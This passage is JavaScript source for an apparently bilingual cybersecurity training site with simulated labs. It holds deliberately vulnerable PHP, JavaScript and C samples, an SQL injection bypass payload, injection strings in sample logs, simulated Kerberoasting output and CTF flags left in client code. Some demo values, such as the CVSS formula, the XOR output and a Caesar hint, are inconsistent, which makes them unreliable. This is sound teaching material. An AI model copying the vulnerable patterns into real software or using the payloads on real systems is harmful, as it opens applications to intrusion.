        }

        btn.addEventListener('click', () => {
            if (inp.value.trim()) {
                replyAI(inp.value.trim());
                inp.value = '';
            }
        });

        inp.addEventListener('keydown', e => {
            if (e.key === 'Enter' && inp.value.trim()) {
                replyAI(inp.value.trim());
                inp.value = '';
            }
        });

        container.querySelectorAll('.prompt-chip').forEach(c => {
            c.addEventListener('click', () => {
                const p = c.getAttribute('data-prompt');
                replyAI(p);
            });
        });
    }

    // 4. AI Code Security Reviewer
    function buildCodeReviewer(container) {
        const isBn = currentLang === 'bn';
        const snippets = {
            sqli: `<?php\n// Vulnerable PHP Login Code\n$username = $_POST['user'];\n$password = $_POST['pass'];\n$query = "SELECT * FROM users WHERE user = '$username' AND pass = '$password'";\n$result = mysqli_query($conn, $query);\n?>`,
            xss: `// Vulnerable JavaScript DOM XSS\nconst urlParams = new URLSearchParams(window.location.search);\nconst name = urlParams.get('name');\ndocument.getElementById('greeting').innerHTML = "Hello " + name;`,
            c_buffer: `// Vulnerable C Buffer Overflow\nvoid check_auth(char *input) {\n    char buffer[32];\n    strcpy(buffer, input); // Unchecked boundary\n}`
        };

        container.innerHTML = `
            <div class="code-audit-container">
                <div class="code-audit-presets">
                    <span style="font-size:0.85rem; color:var(--text-secondary); align-self:center;">${isBn ? 'নমুনা কোড নির্বাচন:' : 'Select Sample Code:'}</span>
                    <button class="preset-btn active" data-preset="sqli">SQL Injection (PHP)</button>
                    <button class="preset-btn" data-preset="xss">DOM XSS (JS)</button>
                    <button class="preset-btn" data-preset="c_buffer">Buffer Overflow (C)</button>
                </div>
                <textarea class="code-textarea" id="audit-code-box">${snippets.sqli}</textarea>
                <div style="display:flex; justify-content:flex-end;">
                    <button class="btn btn-primary" id="btn-run-audit">
                        <span>${isBn ? 'এআই অডিট চালান' : 'Run AI Security Audit'}</span>
                        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                    </button>
                </div>
                <div class="audit-results-card" id="audit-results" style="display:none;"></div>
            </div>
        `;

        const txt = container.querySelector('#audit-code-box');
        const resBox = container.querySelector('#audit-results');
        const btn = container.querySelector('#btn-run-audit');

        container.querySelectorAll('.preset-btn').forEach(b => {
            b.addEventListener('click', () => {
                container.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                const p = b.getAttribute('data-preset');
                txt.value = snippets[p];
                resBox.style.display = 'none';
            });
        });

        btn.addEventListener('click', () => {
            const val = txt.value;
            resBox.style.display = 'block';

            if (val.includes('strcpy')) {
                resBox.innerHTML = `
                    <span class="badge-vuln critical">CRITICAL • CWE-120: Buffer Copy without Checking Size of Input</span>
                    <h4 style="color:#ffffff; margin-bottom:6px;">${isBn ? 'স্ট্যাক বাফার ওভারফ্লো দুর্বলতা' : 'Stack Buffer Overflow Vulnerability'}</h4>
                    <p style="font-size:0.88rem; color:var(--text-secondary); margin-bottom:12px;">${isBn ? 'strcpy ফাংশন ইনপুটের দৈর্ঘ্য যাচাই করে না। এর ফলে স্ট্যাক মেমরি ওভাররাইট করে কোড এক্সিকিউশন সম্ভব।' : 'Unbounded memory copy can overwrite adjacent stack frames, allowing arbitrary code execution.'}</p>
                    <div style="background:#040806; padding:10px; border-radius:6px; font-family:var(--font-mono); font-size:0.82rem; color:var(--neon-green);">
                        // ${isBn ? 'নিরাপদ সমাধান' : 'Remediated Code'}:\nstrncpy(buffer, input, sizeof(buffer) - 1);\nbuffer[sizeof(buffer) - 1] = '\\0';
                    </div>
                `;
            } else if (val.includes('innerHTML')) {
                resBox.innerHTML = `
                    <span class="badge-vuln high">HIGH • CWE-79: Cross-Site Scripting (DOM XSS)</span>
                    <h4 style="color:#ffffff; margin-bottom:6px;">${isBn ? 'অনিরাপদ DOM ইনজেকশন' : 'DOM-based XSS'}</h4>
                    <p style="font-size:0.88rem; color:var(--text-secondary); margin-bottom:12px;">${isBn ? 'innerHTML সরাসরি অনিরাপদ ইউজার ইনপুট রেন্ডার করে। কুকি চুরি ও সেশন হাইজ্যাকিং হতে পারে।' : 'Direct assignment to innerHTML allows arbitrary JavaScript execution in victim browsers.'}</p>
                    <div style="background:#040806; padding:10px; border-radius:6px; font-family:var(--font-mono); font-size:0.82rem; color:var(--neon-green);">
                        // ${isBn ? 'নিরাপদ সমাধান' : 'Remediated Code'}:\ndocument.getElementById('greeting').textContent = "Hello " + name;
                    </div>
                `;
            } else {
                resBox.innerHTML = `
                    <span class="badge-vuln critical">CRITICAL • CWE-89: SQL Injection Flaw</span>
                    <h4 style="color:#ffffff; margin-bottom:6px;">${isBn ? 'এসকিউএল ইনজেকশন সনাক্ত হয়েছে' : 'SQL Injection Detected'}</h4>
                    <p style="font-size:0.88rem; color:var(--text-secondary); margin-bottom:12px;">${isBn ? 'সরাসরি কোয়েরিতে ভ্যারিয়েবল কনক্যাটেনেশনের ফলে আক্রমণকারী \' OR 1=1 -- দিয়ে পাসওয়ার্ড বাইপাস করতে পারে।' : 'Direct concatenation enables authentication bypass using payloads like "\' OR \'1\'=\'1".'}</p>
                    <div style="background:#040806; padding:10px; border-radius:6px; font-family:var(--font-mono); font-size:0.82rem; color:var(--neon-green);">
                        // ${isBn ? 'নিরাপদ সমাধান (Prepared Statements)' : 'Remediated Secure Code'}:\n$stmt = $conn->prepare("SELECT id, user FROM users WHERE user = ? AND pass = ?");\n$stmt->bind_param("ss", $username, $passwordHash);\n$stmt->execute();
                    </div>
                `;
            }
        });
    }

    // 5. CVSS v3.1 Calculator
    function buildCVSSCalculator(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div style="display:grid; grid-template-columns: 1fr 280px; gap: 20px;">
                <div>
                    <div class="cvss-metric-group">
                        <span class="cvss-label">Attack Vector (AV):</span>
                        <div class="cvss-options" data-metric="av">
                            <button class="cvss-btn active" data-val="0.85">Network (N)</button>
                            <button class="cvss-btn" data-val="0.62">Adjacent (A)</button>
                            <button class="cvss-btn" data-val="0.55">Local (L)</button>
                            <button class="cvss-btn" data-val="0.2">Physical (P)</button>
                        </div>
                    </div>
                    <div class="cvss-metric-group">
                        <span class="cvss-label">Attack Complexity (AC):</span>
                        <div class="cvss-options" data-metric="ac">
                            <button class="cvss-btn active" data-val="0.77">Low (L)</button>
                            <button class="cvss-btn" data-val="0.44">High (H)</button>
                        </div>
                    </div>
                    <div class="cvss-metric-group">
                        <span class="cvss-label">Privileges Required (PR):</span>
                        <div class="cvss-options" data-metric="pr">
                            <button class="cvss-btn active" data-val="0.85">None (N)</button>
                            <button class="cvss-btn" data-val="0.62">Low (L)</button>
                            <button class="cvss-btn" data-val="0.27">High (H)</button>
                        </div>
                    </div>
                    <div class="cvss-metric-group">
                        <span class="cvss-label">Impact (Confidentiality / Integrity / Availability):</span>
                        <div class="cvss-options" data-metric="imp">
                            <button class="cvss-btn active" data-val="0.56">High (Complete Takeover)</button>
                            <button class="cvss-btn" data-val="0.22">Low (Partial Access)</button>
                            <button class="cvss-btn" data-val="0.0">None</button>
                        </div>
                    </div>
                </div>
                <div>
                    <div class="cvss-score-box">
                        <span style="font-size:0.8rem; font-family:var(--font-mono); color:var(--text-muted);">CVSS v3.1 BASE SCORE</span>
                        <div class="cvss-score-num" id="cvss-score-num">9.8</div>
                        <span class="badge-vuln critical" id="cvss-rating-badge">CRITICAL</span>
                    </div>
                    <p style="font-size:0.84rem; color:var(--text-secondary); margin-top:14px; line-height:1.5;">
                        ${isBn ? 'এই স্কোরিং মেথডোলজি আন্তর্জাতিক ফার্স্ট (FIRST) ও এনআইএসটি (NVD) মানদণ্ড অনুযায়ী কাজ করে।' : 'Calculated following FIRST CVSS v3.1 specification for vulnerability severity triage.'}
                    </p>
                </div>
            </div>
        `;

        function recalculate() {
            let av = parseFloat(container.querySelector('[data-metric="av"] .active').getAttribute('data-val'));
            let ac = parseFloat(container.querySelector('[data-metric="ac"] .active').getAttribute('data-val'));
            let pr = parseFloat(container.querySelector('[data-metric="pr"] .active').getAttribute('data-val'));
            let imp = parseFloat(container.querySelector('[data-metric="imp"] .active').getAttribute('data-val'));

            let iss = 1 - (1 - imp) * (1 - imp) * (1 - imp);
            let impactScore = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
            if (impactScore < 0) impactScore = 0;
            let exploitability = 8.22 * av * ac * pr * 0.85;

            let score = 0;
            if (impactScore > 0) {
                score = Math.min(10.0, Math.ceil((impactScore + exploitability) * 10) / 10);
            }

            const num = container.querySelector('#cvss-score-num');
            const badge = container.querySelector('#cvss-rating-badge');

            num.textContent = formatNumber(score.toFixed(1), currentLang);

            if (score >= 9.0) {
                badge.className = 'badge-vuln critical';
                badge.textContent = 'CRITICAL';
            } else if (score >= 7.0) {
                badge.className = 'badge-vuln high';
                badge.textContent = 'HIGH';
            } else if (score >= 4.0) {
                badge.className = 'badge-vuln medium';
                badge.textContent = 'MEDIUM';
            } else {
                badge.className = 'badge-vuln clean';
                badge.textContent = 'LOW';
            }
        }

        container.querySelectorAll('.cvss-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const group = btn.closest('.cvss-options');
                group.querySelectorAll('.cvss-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                recalculate();
            });
        });
    }

    // 6. AI Incident Log Analyzer
    function buildIncidentLogAnalyzer(container) {
        const isBn = currentLang === 'bn';
        const sampleLogs = `Oct 30 00:04:12 edge-firewall kernel: [ATTACK] DROP TCP 198.51.100.42:54210 -> 10.0.0.5:22 [SYN_FLOOD]\nOct 30 00:04:15 srv-web01 nginx[1284]: "GET /login.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 403 162\nOct 30 00:04:19 win-dc-01 EventLog[4769]: Kerberos Ticket Requested Account: svc_backup Encryption: 0x17 (RC4-HMAC)`;

        container.innerHTML = `
            <div>
                <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:12px;">
                    ${isBn ? 'সার্ভার বা ফায়ারওয়াল সিকিউরিটি লগ পেস্ট করুন। এআই স্বয়ংক্রিয়ভাবে আক্রমণের ভেক্টর শনাক্ত করে MITRE ATT&CK ম্যাপিং করবে:' : 'Paste system event logs to automatically triage threat vectors and map to MITRE ATT&CK techniques:'}
                </p>
                <textarea class="code-textarea" id="incident-log-box" style="height:120px;">${sampleLogs}</textarea>
                <div style="margin-top:12px; display:flex; justify-content:flex-end;">
                    <button class="btn btn-primary" id="btn-triage-log">
                        <span>${isBn ? 'লগ অ্যানালাইজ করুন' : 'Analyze Threat Logs'}</span>
                    </button>
                </div>
                <div id="log-triage-output" style="margin-top:16px;"></div>
            </div>
        `;

        const btn = container.querySelector('#btn-triage-log');
        const out = container.querySelector('#log-triage-output');

        btn.addEventListener('click', () => {
            out.innerHTML = `
                <div style="background:#07120c; border:1px solid var(--border-bright); border-radius:8px; padding:16px;">
                    <h4 style="color:#ffffff; margin-bottom:10px;">🚨 ${isBn ? 'সনাক্তকৃত থ্রেট বিশ্লেষণ রিপোর্ট' : 'Identified Threat Triage Report'}</h4>
                    <div style="display:flex; flex-direction:column; gap:8px;">
                        <div style="background:#040906; padding:10px; border-left:3px solid var(--crimson);">
                            <strong>1. SYN Flood Denial of Service</strong> • <code>T1498: Network Denial of Service</code><br>
                            <span style="font-size:0.84rem; color:var(--text-secondary);">${isBn ? 'উৎস IP: 198.51.100.42 বন্দর ২২ এ আক্রমণ চালিয়েছে। ফায়ারওয়াল DROP প্রয়োগ করেছে।' : 'Source IP 198.51.100.42 dropped at edge firewall.'}</span>
                        </div>
                        <div style="background:#040906; padding:10px; border-left:3px solid #ff7300;">
                            <strong>2. SQL Injection Reconnaissance</strong> • <code>T1190: Exploit Public-Facing Application</code><br>
                            <span style="font-size:0.84rem; color:var(--text-secondary);">${isBn ? 'UNION SELECT পেলোড দিয়ে ডেটাবেস স্ক্যানিং প্রচেষ্টা।' : 'Exploitation payload targeting /login.php blocked with HTTP 403.'}</span>
                        </div>
                        <div style="background:#040906; padding:10px; border-left:3px solid var(--gold);">
                            <strong>3. Kerberoasting Ticket Triage</strong> • <code>T1558.003: Steal or Forge Kerberos Tickets</code><br>
                            <span style="font-size:0.84rem; color:var(--text-secondary);">${isBn ? 'svc_backup অ্যাকাউন্টে RC4 এনক্রিপশন রিকোয়েস্ট।' : 'Abnormal RC4-HMAC ticket request on service account svc_backup.'}</span>
                        </div>
                    </div>
                </div>
            `;
        });
    }

    // 7. Reverse Engineering Lab
    function buildReverseEngineeringLab(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div>
                <div style="display:flex; gap:10px; margin-bottom:14px;">
                    <button class="preset-btn active" id="btn-re-asm">x86 Disassembly</button>
                    <button class="preset-btn" id="btn-re-decomp">C Pseudocode</button>
                    <button class="preset-btn" id="btn-re-headers">PE Headers</button>
                    <button class="preset-btn" id="btn-re-xor">XOR String Decryptor</button>
                </div>
                <div id="re-content-area" style="background:#040806; border:1px solid var(--border); border-radius:8px; padding:16px; font-family:var(--font-mono); font-size:0.88rem; color:var(--neon-green); min-height:220px;">
                    ; Function: verify_license_key(char *key)\npush    ebp\nmov     ebp, esp\nsub     esp, 16\nmov     eax, [ebp+8]        ; load key string\ncmp     byte ptr [eax], 'C' ; check prefix 'C'\njne     loc_fail\ncmp     byte ptr [eax+1], 'P'\njne     loc_fail\nxor     ecx, ecx\nloc_loop:\nmovzx   edx, byte ptr [eax+ecx]\nxor     edx, 0x5A           ; XOR key with 0x5A\ncmp     edx, 0x3F\n...
                </div>
            </div>
        `;

        const area = container.querySelector('#re-content-area');

        container.querySelector('#btn-re-asm').addEventListener('click', () => {
            area.textContent = `; Function: verify_license_key(char *key)\npush    ebp\nmov     ebp, esp\nsub     esp, 16\nmov     eax, [ebp+8]        ; load key string\ncmp     byte ptr [eax], 'C' ; check prefix 'C'\njne     loc_fail\ncmp     byte ptr [eax+1], 'P'\njne     loc_fail\nxor     ecx, ecx\nloc_loop:\nmovzx   edx, byte ptr [eax+ecx]\nxor     edx, 0x5A           ; XOR key with 0x5A\ncmp     edx, 0x3F\njne     loc_fail\ninc     ecx\ncmp     ecx, 16\njl      loc_loop\nmov     eax, 1              ; Access Granted\nleave\nret`;
        });

        container.querySelector('#btn-re-decomp').addEventListener('click', () => {
            area.textContent = `// Decompiled with CyberLab Decompiler Engine v2.4\nint verify_license_key(char *key) {\n    if (key[0] != 'C' || key[1] != 'P') return 0;\n    for (int i = 0; i < 16; i++) {\n        if ((key[i] ^ 0x5A) != 0x3F) {\n            return 0; // Key validation failed\n        }\n    }\n    return 1; // Valid Key!\n}`;
        });

        container.querySelector('#btn-re-headers').addEventListener('click', () => {
            area.textContent = `DOS HEADER (IMAGE_DOS_HEADER):\n  e_magic: 0x5A4D (MZ)\n  e_lfanew: 0x000000F8\n\nPE HEADER (IMAGE_NT_HEADERS):\n  Signature: 0x00004550 (PE\\0\\0)\n  Machine: 0x8664 (AMD64)\n  NumberOfSections: 5 (.text, .rdata, .data, .pdata, .rsrc)\n  TimeDateStamp: 0x6720BC80 (Oct 30 2026)\n  Characteristics: 0x0022 (EXECUTABLE_IMAGE, LARGE_ADDRESS_AWARE)\n\nOPTIONAL HEADER:\n  Magic: 0x020B (PE32+)\n  AddressOfEntryPoint: 0x000014B0\n  ImageBase: 0x0000000140000000`;
        });

        container.querySelector('#btn-re-xor').addEventListener('click', () => {
            area.innerHTML = `
                <div style="color:#ffffff;">
                    <strong>${isBn ? 'ইন্টারঅ্যাক্টিভ XOR স্ট্রিং ডিক্রিপ্টর:' : 'Interactive XOR String Decryptor:'}</strong>
                    <div style="margin-top:10px;">
                        <input type="text" id="xor-input" value="1f1a1639141f" placeholder="Hex string (e.g. 1f1a16)" style="background:#09130e; border:1px solid var(--border); color:#ffffff; padding:6px 10px; font-family:var(--font-mono); width:200px;">
                        Key (0-255): <input type="number" id="xor-key" value="90" style="background:#09130e; border:1px solid var(--border); color:#ffffff; padding:6px; width:70px;">
                        <button class="btn btn-secondary" id="btn-calc-xor" style="padding:6px 12px;">Decrypt</button>
                    </div>
                    <div id="xor-result" style="margin-top:14px; font-family:var(--font-mono); color:var(--neon-green);">Decrypted text: CPL{OK}</div>
                </div>
            `;
            container.querySelector('#btn-calc-xor').addEventListener('click', () => {
                const hex = container.querySelector('#xor-input').value.replace(/\s+/g, '');
                const k = parseInt(container.querySelector('#xor-key').value, 10) || 0;
                let res = '';
                for (let i = 0; i < hex.length; i += 2) {
                    const byte = parseInt(hex.substr(i, 2), 16);
                    res += String.fromCharCode(byte ^ k);
                }
                container.querySelector('#xor-result').textContent = 'Decrypted text: ' + res;
            });
        });
    }

    // 8. Active Directory Lab
    function buildActiveDirectoryLab(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div>
                <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:14px;">
                    ${isBn ? 'উইন্ডোজ অ্যাক্টিভ ডিরেক্টরি টপোলজি ও কার্বেরোস টিকিট আক্রমণ বিশ্লেষণ:' : 'Windows Active Directory Domain Controller & Kerberos Security Simulation:'}
                </p>
                <div style="background:#040906; border:1px solid var(--border); border-radius:8px; padding:16px; margin-bottom:16px;">
                    <div style="display:flex; justify-content:space-around; text-align:center;">
                        <div style="background:#0a1810; padding:12px; border-radius:8px; border:1px solid var(--neon-green);">
                            <span style="font-size:1.6rem;">🏰</span>
                            <div style="font-weight:700; color:#ffffff;">DC01.CORP.LOCAL</div>
                            <span style="font-size:0.75rem; color:var(--neon-cyan);">Domain Controller</span>
                        </div>
                        <div style="align-self:center; color:var(--neon-green); font-size:1.5rem;">⟷</div>
                        <div style="background:#0a1810; padding:12px; border-radius:8px; border:1px solid var(--gold);">
                            <span style="font-size:1.6rem;">⚙️</span>
                            <div style="font-weight:700; color:#ffffff;">MSSQL_SVC</div>
                            <span style="font-size:0.75rem; color:var(--gold);">Service SPN (Kerberoasting Target)</span>
                        </div>
                        <div style="align-self:center; color:var(--neon-green); font-size:1.5rem;">⟷</div>
                        <div style="background:#0a1810; padding:12px; border-radius:8px; border:1px solid #ff7300;">
                            <span style="font-size:1.6rem;">💻</span>
                            <div style="font-weight:700; color:#ffffff;">WKSTN-104</div>
                            <span style="font-size:0.75rem; color:var(--text-muted);">Compromised Workstation</span>
                        </div>
                    </div>
                </div>
                <div style="display:flex; gap:10px;">
                    <button class="btn btn-secondary" id="btn-ad-asrep">${isBn ? 'AS-REP Roasting সিমুলেট' : 'Simulate AS-REP Roasting'}</button>
                    <button class="btn btn-primary" id="btn-ad-kerb">${isBn ? 'Kerberoasting সিমুলেট' : 'Simulate Kerberoasting'}</button>
                </div>
                <div id="ad-log-box" style="margin-top:14px; background:#040806; padding:14px; border-radius:8px; font-family:var(--font-mono); font-size:0.85rem; color:var(--neon-green); display:none;"></div>
            </div>
        `;

        const box = container.querySelector('#ad-log-box');
        container.querySelector('#btn-ad-asrep').addEventListener('click', () => {
            box.style.display = 'block';
            box.innerHTML = `[+] Querying LDAP for accounts with 'Do not require Kerberos preauthentication'...\n[+] Found vulnerable account: jsmith@CORP.LOCAL\n[+] AS-REQ sent to KDC without pre-auth timestamp.\n[+] Received AS-REP response with encrypted TGT!\n[+] Hashcat format: $krb5asrep$23$jsmith@CORP.LOCAL:e4f3a1... (Crackable offline)\n[!] Defense: Ensure Pre-authentication is checked for all user accounts!`;
        });
        container.querySelector('#btn-ad-kerb').addEventListener('click', () => {
            box.style.display = 'block';
            box.innerHTML = `[+] Requesting TGS ticket for SPN: MSSQLSvc/db01.corp.local:1433...\n[+] Kerberos TGS-REP received using RC4-HMAC cipher.\n[+] Extracted Kerberoast Hash: $krb5tgs$23$*MSSQL_SVC*...\n[+] Weak service account password vulnerable to dictionary attack.\n[!] Defense: Enforce 25+ character passwords or transition to Group Managed Service Accounts (gMSA).`;
        });
    }

    // 9. Network Forensics Lab (PCAP Viewer)
    function buildNetworkForensicsLab(container) {
        const packets = [
            { no: 1, time: '0.000', src: '192.168.1.105', dst: '192.168.1.1', proto: 'DNS', info: 'Standard query 0x124a A bank.corp.internal' },
            { no: 2, time: '0.002', src: '192.168.1.1', dst: '192.168.1.105', proto: 'DNS', info: 'Standard query response 0x124a A 10.0.0.8' },
            { no: 3, time: '0.015', src: '192.168.1.105', dst: '10.0.0.8', proto: 'TCP', info: '54212 → 80 [SYN] Seq=0 Win=64240 Len=0' },
            { no: 4, time: '0.016', src: '10.0.0.8', dst: '192.168.1.105', proto: 'TCP', info: '80 → 54212 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0' },
            { no: 5, time: '0.017', src: '192.168.1.105', dst: '10.0.0.8', proto: 'HTTP', info: 'POST /transfer.php HTTP/1.1 (application/x-www-form-urlencoded)' },
            { no: 6, time: '0.040', src: '192.168.1.200', dst: '192.168.1.1', proto: 'ARP', info: 'ARP Spoof: Who has 192.168.1.1? Tell 192.168.1.200 (Poison)' }
        ];

        container.innerHTML = `
            <div>
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
                    <div style="display:flex; gap:8px;">
                        <button class="chip-cmd active pcap-filter" data-proto="ALL">ALL (6)</button>
                        <button class="chip-cmd pcap-filter" data-proto="DNS">DNS (2)</button>
                        <button class="chip-cmd pcap-filter" data-proto="TCP">TCP (2)</button>
                        <button class="chip-cmd pcap-filter" data-proto="HTTP">HTTP (1)</button>
                        <button class="chip-cmd pcap-filter" data-proto="ARP">ARP (1)</button>
                    </div>
                    <span style="font-family:var(--font-mono); font-size:0.8rem; color:var(--neon-green);">capture_2026_investigation.pcap</span>
                </div>
                <div style="max-height:220px; overflow-y:auto; border:1px solid var(--border); border-radius:6px;">
                    <table style="width:100%; border-collapse:collapse; font-size:0.82rem; font-family:var(--font-mono); text-align:left;">
                        <thead style="background:#091a11; color:var(--neon-cyan);">
                            <tr><th style="padding:6px;">No.</th><th style="padding:6px;">Time</th><th style="padding:6px;">Source</th><th style="padding:6px;">Destination</th><th style="padding:6px;">Protocol</th><th style="padding:6px;">Info</th></tr>
                        </thead>
                        <tbody id="pcap-tbody"></tbody>
                    </table>
                </div>
                <div id="packet-hex-dump" style="margin-top:14px; background:#040806; border:1px solid var(--border); border-radius:6px; padding:12px; font-family:var(--font-mono); font-size:0.8rem; color:#a4c7b4;">
                    Click any packet above to view dissected payload and raw hex bytes.
                </div>
            </div>
        `;

        const tbody = container.querySelector('#pcap-tbody');
        const dump = container.querySelector('#packet-hex-dump');

        function renderRows(filtered) {
            tbody.innerHTML = filtered.map(p => `
                <tr class="pcap-row" data-no="${p.no}" style="cursor:pointer; border-bottom:1px solid #102418;">
                    <td style="padding:6px; color:var(--text-muted);">${p.no}</td>
                    <td style="padding:6px;">${p.time}</td>
                    <td style="padding:6px;">${p.src}</td>
                    <td style="padding:6px;">${p.dst}</td>
                    <td style="padding:6px; font-weight:700; color:${p.proto === 'ARP' ? '#ff3366' : p.proto === 'HTTP' ? '#00ff88' : '#00d2ff'};">${p.proto}</td>
                    <td style="padding:6px;">${p.info}</td>
                </tr>
            `).join('');

            tbody.querySelectorAll('.pcap-row').forEach(tr => {
                tr.addEventListener('click', () => {
                    const no = parseInt(tr.getAttribute('data-no'), 10);
                    const sel = packets.find(x => x.no === no);
                    dump.innerHTML = `
                        <div style="color:var(--neon-green); font-weight:700; margin-bottom:6px;">Packet #${sel.no} Details (${sel.proto}):</div>
                        <div>Source: ${sel.src} ➔ Destination: ${sel.dst}</div>
                        <div style="margin-top:8px; color:#ffffff;">Hex Dump:</div>
                        <pre style="color:var(--neon-cyan); margin-top:4px;">0000  00 0c 29 4f 8e 35 00 50 56 c0 00 08 08 00 45 00  ..)O.5.PV.....E.
0010  00 3c b2 a1 40 00 40 06 b8 12 c0 a8 01 69 0a 00  .<..@.@......i..
0020  00 08 d3 c4 00 50 00 00 00 00 a0 02 fa f0 b2 34  .....P.........4</pre>
                    `;
                });
            });
        }

        renderRows(packets);

        container.querySelectorAll('.pcap-filter').forEach(btn => {
            btn.addEventListener('click', () => {
                container.querySelectorAll('.pcap-filter').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const proto = btn.getAttribute('data-proto');
                if (proto === 'ALL') renderRows(packets);
                else renderRows(packets.filter(x => x.proto === proto));
            });
        });
    }

    // 10. CTF Competition Arena
    function buildCTFArena(container) {
        const isBn = currentLang === 'bn';
        const challenges = [
            { id: 'ctf1', title: 'Web: The Hidden Cookie', cat: 'Web Security', pts: 100, flag: 'CPL{c00k1e_h1dd3n_auth}', hint: 'Inspect HTTP response headers and session cookies.' },
            { id: 'ctf2', title: 'Crypto: Caesar Rotation', cat: 'Cryptography', pts: 150, flag: 'CPL{r0t13_d3crypt3d}', hint: 'Cipher: PYM{e0g13_q3pelcg3q} — Shift by 13.' },
            { id: 'ctf3', title: 'Reverse: Binary XOR', cat: 'Reverse Engineering', pts: 200, flag: 'CPL{x0r_k3y_m4st3r}', hint: 'Examine verify_key function XORed with 0x5A.' },
            { id: 'ctf4', title: 'Forensics: Suspicious ARP', cat: 'Network Forensics', pts: 150, flag: 'CPL{4rp_sp00f_d3t3ct3d}', hint: 'Look for duplicate MAC addresses claiming the default gateway IP.' }
        ];

        let solved = {};
        try {
            solved = JSON.parse(localStorage.getItem(STORAGE_KEY_SOLVED_CTF) || '{}');
        } catch (e) {}

        container.innerHTML = `
            <div>
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
                    <span style="font-size:0.95rem; font-weight:700; color:#ffffff;">${isBn ? 'প্রতিযোগিতামূলক চ্যালেঞ্জ বোর্ড' : 'Competitive CTF Challenge Board'}</span>
                    <span style="background:rgba(255,209,102,0.15); border:1px solid var(--gold); color:var(--gold); padding:4px 10px; border-radius:12px; font-family:var(--font-mono); font-size:0.85rem;" id="ctf-score-display">Score: 0 pts</span>
                </div>
                <div id="ctf-cards-list"></div>
            </div>
        `;

        const list = container.querySelector('#ctf-cards-list');
        const scoreDisp = container.querySelector('#ctf-score-display');

        function updateScore() {
            let total = 0;
            challenges.forEach(c => {
                if (solved[c.id]) total += c.pts;
            });
            scoreDisp.textContent = `Score: ${formatNumber(total, currentLang)} pts`;
        }

        list.innerHTML = challenges.map(c => {
            const isSolved = !!solved[c.id];
            return `
                <div class="ctf-card" id="card-${c.id}">
                    <div class="ctf-card-header">
                        <div>
                            <span style="font-size:0.75rem; color:var(--neon-cyan); font-family:var(--font-mono); text-transform:uppercase;">${c.cat}</span>
                            <h4 style="color:#ffffff;">${c.title}</h4>
                        </div>
                        <span class="ctf-points">${c.pts} PTS</span>
                    </div>
                    <p style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:8px;">Hint: ${c.hint}</p>
                    <div class="ctf-flag-input-group">
                        <input type="text" class="ctf-input" id="input-${c.id}" placeholder="Flag format: CPL{...}" ${isSolved ? 'value="SOLVED ✓" disabled' : ''}>
                        <button class="btn btn-primary btn-submit-flag" data-id="${c.id}" ${isSolved ? 'disabled' : ''}>
                            <span>${isSolved ? (isBn ? 'সম্পন্ন' : 'Solved') : (isBn ? 'জমা দিন' : 'Submit')}</span>
                        </button>
                    </div>
                </div>
            `;
        }).join('');

        list.querySelectorAll('.btn-submit-flag').forEach(b => {
            b.addEventListener('click', () => {
                const id = b.getAttribute('data-id');
                const inp = list.querySelector(`#input-${id}`);
                const c = challenges.find(x => x.id === id);
                if (inp.value.trim() === c.flag) {
                    solved[id] = true;
                    localStorage.setItem(STORAGE_KEY_SOLVED_CTF, JSON.stringify(solved));
                    b.textContent = isBn ? 'সঠিক! (+100 XP)' : 'Correct! (+100 XP)';
                    b.disabled = true;
                    inp.disabled = true;
                    updateScore();
                    // Boost skill
                    skillScores.Exploitation = Math.min(100, skillScores.Exploitation + 10);
                    saveSkillScores();
                    drawRadarChart();
                } else {
                    inp.style.borderColor = '#ff3366';
                    inp.value = '';
                    inp.placeholder = isBn ? 'ভুল ফ্ল্যাগ! আবার চেষ্টা করুন' : 'Incorrect Flag! Try again';
                }
            });
        });

        updateScore();
    }

    // 11. Diagnostic Assessment & Certificate Verification
    function buildDiagnosticAssessment(container) {
        const isBn = currentLang === 'bn';
        const questions = [
            { q: 'Which TCP flag is sent to initiate the 3-way handshake?', opts: ['ACK', 'SYN', 'FIN', 'RST'], a: 1 },
            { q: 'What is the defensive solution against SQL Injection?', opts: ['Client-side regex', 'Prepared Statements', 'MD5 hashing', 'Base64 encoding'], a: 1 },
            { q: 'In Linux permissions, what does octal 755 represent?', opts: ['rwxr-xr-x', 'rw-rw-rw-', 'rwx------', 'rwxrwxrwx'], a: 0 },
            { q: 'Which attack exploits Windows Kerberos service tickets for offline cracking?', opts: ['Pass-the-Hash', 'Kerberoasting', 'ARP Spoofing', 'SQL Injection'], a: 1 }
        ];

        let currentQ = 0;
        let score = 0;

        function showQ() {
            if (currentQ >= questions.length) {
                const percent = Math.round((score / questions.length) * 100);
                container.innerHTML = `
                    <div style="text-align:center; padding:20px;">
                        <span style="font-size:3rem;">🎓</span>
                        <h3 style="color:#ffffff; margin:10px 0;">${isBn ? 'দক্ষতা পরীক্ষা সম্পন্ন!' : 'Diagnostic Assessment Complete!'}</h3>
                        <div class="cvss-score-num" style="color:var(--neon-green);">${formatNumber(percent, currentLang)}%</div>
                        <p style="color:var(--text-secondary); margin:14px 0;">
                            ${percent >= 75 ? (isBn ? 'অভিনন্দন! আপনি সাইবার একাডেমি সনদ অর্জনের যোগ্যতা অর্জন করেছেন।' : 'Congratulations! You qualify for the Official Certificate of Completion.') : (isBn ? 'আরও কিছুটা প্রস্তুতি প্রয়োজন। ল্যাবগুলো পুনরায় অনুশীলন করুন।' : 'Review the fundamental labs and try again!')}
                        </p>
